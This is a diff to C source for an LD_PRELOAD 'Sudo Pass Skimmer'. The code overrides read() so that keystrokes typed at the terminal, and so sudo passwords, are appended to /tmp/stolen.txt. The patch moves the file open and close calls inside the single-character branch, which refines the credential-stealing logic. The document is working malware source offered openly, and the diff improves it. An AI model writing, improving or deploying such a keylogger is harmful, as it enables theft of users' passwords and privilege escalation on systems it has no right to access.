@@ -1,4 +1,3 @@
-
 /* 
  *                           LD_PRELOAD Sudo Pass Skimmer
  *
@@ -76,10 +75,9 @@ ssize_t read(int fd, void *buf, size_t count) {
     if(getfsize("/tmp/stolen.txt") >= MAX_FILE_SIZE) {
       return original_read(fd, buf, count);
     }
-    // we open the file in append/read mode
-    FILE *stealer = fopen("/tmp/stolen.txt", "a+");
     // this helps us isolate the characters from term only
     if(count == 1) {
+    FILE *stealer = fopen("/tmp/stolen.txt", "a+");
       // here we are getting the cooresponding int to our currently
       // written key and writing it to our keybuf, where can then
       // pull the single key as a char to run our test.
@@ -107,8 +105,8 @@ ssize_t read(int fd, void *buf, size_t count) {
 	// a time.
 	fprintf(stealer, "%.1s", (char *)buf);
       }
+      fclose(stealer);
     }
-    fclose(stealer);
   }
   // now just go back to the original read function
   return original_read(fd, buf, count);
